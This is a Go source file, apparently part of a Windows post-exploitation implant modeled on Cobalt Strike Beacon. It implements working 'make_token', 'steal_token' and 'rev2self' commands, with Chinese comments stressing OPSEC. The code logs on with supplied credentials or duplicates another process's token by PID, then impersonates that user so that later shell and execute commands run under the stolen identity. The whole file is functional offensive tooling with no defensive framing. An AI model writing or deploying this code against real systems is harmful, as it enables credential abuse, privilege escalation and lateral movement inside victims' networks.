//go:build windows

package commands

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

// ===== A8: Token 操作链 =====
// make_token <user>|<pass>|<domain> : LogonUser + DuplicateTokenEx + ImpersonateLoggedOnUser
// steal_token <pid>                 : OpenProcessToken + DuplicateTokenEx + ImpersonateLoggedOnUser
// rev2self                          : RevertToSelf + 清理模拟句柄
//
// 【OPSEC】线程级模拟：主循环线程模拟后，后续 SHELL/EXECUTE 等命令自动运行在目标令牌上下文
// （与 CS Beacon 的 useToken 语义一致）。句柄最小化、操作后显式 rev2self 恢复。

var (
	tokenMu      sync.Mutex
	currentToken uintptr // 当前模拟令牌句柄（0 = 未模拟）
)

const (
	tokenDuplicate      = 0x0002
	tokenImpersonation  = 0x0004
	tokenQuery          = 0x0008
	securityImpersonation = 2 // SecurityImpersonation
	tokenDefault        = 0
	logonNewCredentials = 9 // LOGON32_LOGON_NEW_CREDENTIALS（不提升权限，OPSEC 友好）
	logonProviderDefault = 0
	maximumAllowed      = 0x02000000
	processQueryInfo    = 0x0400
)

// CmdMakeToken 创建令牌并模拟: make_token <user>|<pass>|<domain>
func CmdMakeToken(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 3)
	if len(parts) < 2 {
		return nil, fmt.Errorf("用法: make_token <user>|<pass>|<domain>")
	}
	user := strings.TrimSpace(parts[0])
	pass := parts[1]
	domain := ""
	if len(parts) == 3 {
		domain = strings.TrimSpace(parts[2])
	}
	if user == "" {
		return nil, fmt.Errorf("用户名为空")
	}

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	logonUser := advapi32.NewProc("LogonUserW")
	duplicateTokenEx := advapi32.NewProc("DuplicateTokenEx")
	impersonateLoggedOnUser := advapi32.NewProc("ImpersonateLoggedOnUser")
	getLastError := kernel32.NewProc("GetLastError")
	closeHandle := kernel32.NewProc("CloseHandle")

	userW, _ := syscall.UTF16PtrFromString(user)
	domainW, _ := syscall.UTF16PtrFromString(domain)
	passW, _ := syscall.UTF16PtrFromString(pass)

	var hToken uintptr
	ret, _, _ := logonUser.Call(
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		uintptr(logonNewCredentials),
		uintptr(logonProviderDefault),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 || hToken == 0 {
		return nil, fmt.Errorf("LogonUser 失败 (LastError=%d)，请确认凭据正确", lastErrValue(getLastError))
	}
	defer closeHandle.Call(hToken)

	var dupToken uintptr
	ret, _, _ = duplicateTokenEx.Call(
		hToken,
		uintptr(maximumAllowed),
		0,
		uintptr(securityImpersonation),
		uintptr(tokenImpersonation),
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 || dupToken == 0 {
		return nil, fmt.Errorf("DuplicateTokenEx 失败 (LastError=%d)", lastErrValue(getLastError))
	}

	// 模拟
	ret, _, _ = impersonateLoggedOnUser.Call(dupToken)
	if ret == 0 {
		closeHandle.Call(dupToken)
		return nil, fmt.Errorf("ImpersonateLoggedOnUser 失败 (LastError=%d)", lastErrValue(getLastError))
	}

	tokenMu.Lock()
	if currentToken != 0 {
		closeHandle.Call(currentToken)
	}
	currentToken = dupToken
	tokenMu.Unlock()

	return []byte(fmt.Sprintf("✅ 令牌已创建并模拟: %s\\%s（后续命令运行在该令牌上下文，执行 rev2self 恢复）", domain, user)), nil
}

// CmdStealToken 窃取进程令牌并模拟: steal_token <pid>
func CmdStealToken(cmdBuf []byte) ([]byte, error) {
	pid, err := strconv.Atoi(strings.TrimSpace(string(cmdBuf)))
	if err != nil || pid <= 0 {
		return nil, fmt.Errorf("用法: steal_token <pid>")
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	openProcessToken := advapi32.NewProc("OpenProcessToken")
	duplicateTokenEx := advapi32.NewProc("DuplicateTokenEx")
	impersonateLoggedOnUser := advapi32.NewProc("ImpersonateLoggedOnUser")
	getLastError := kernel32.NewProc("GetLastError")
	closeHandle := kernel32.NewProc("CloseHandle")

	hProc, _, _ := openProcess.Call(uintptr(processQueryInfo), 0, uintptr(pid))
	if hProc == 0 {
		return nil, fmt.Errorf("OpenProcess 失败 (pid=%d, LastError=%d)，请确认权限", pid, lastErrValue(getLastError))
	}
	defer closeHandle.Call(hProc)

	var hToken uintptr
	ret, _, _ := openProcessToken.Call(hProc, uintptr(tokenDuplicate), uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 || hToken == 0 {
		return nil, fmt.Errorf("OpenProcessToken 失败 (LastError=%d)", lastErrValue(getLastError))
	}
	defer closeHandle.Call(hToken)

	var dupToken uintptr
	ret, _, _ = duplicateTokenEx.Call(
		hToken,
		uintptr(maximumAllowed),
		0,
		uintptr(securityImpersonation),
		uintptr(tokenImpersonation),
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 || dupToken == 0 {
		return nil, fmt.Errorf("DuplicateTokenEx 失败 (LastError=%d)", lastErrValue(getLastError))
	}

	ret, _, _ = impersonateLoggedOnUser.Call(dupToken)
	if ret == 0 {
		closeHandle.Call(dupToken)
		return nil, fmt.Errorf("ImpersonateLoggedOnUser 失败 (LastError=%d)", lastErrValue(getLastError))
	}

	tokenMu.Lock()
	if currentToken != 0 {
		closeHandle.Call(currentToken)
	}
	currentToken = dupToken
	tokenMu.Unlock()

	return []byte(fmt.Sprintf("✅ 已窃取并模拟进程 %d 的令牌（后续命令运行在该令牌上下文，执行 rev2self 恢复）", pid)), nil
}

// CmdRev2Self 恢复原始令牌
func CmdRev2Self() ([]byte, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	revertToSelf := advapi32.NewProc("RevertToSelf")
	closeHandle := kernel32.NewProc("CloseHandle")

	tokenMu.Lock()
	hadToken := currentToken != 0
	if hadToken {
		closeHandle.Call(currentToken)
		currentToken = 0
	}
	tokenMu.Unlock()

	revertToSelf.Call()

	if hadToken {
		return []byte("✅ 已恢复原始令牌（rev2self）"), nil
	}
	return []byte("ℹ️ 当前未模拟任何令牌"), nil
}
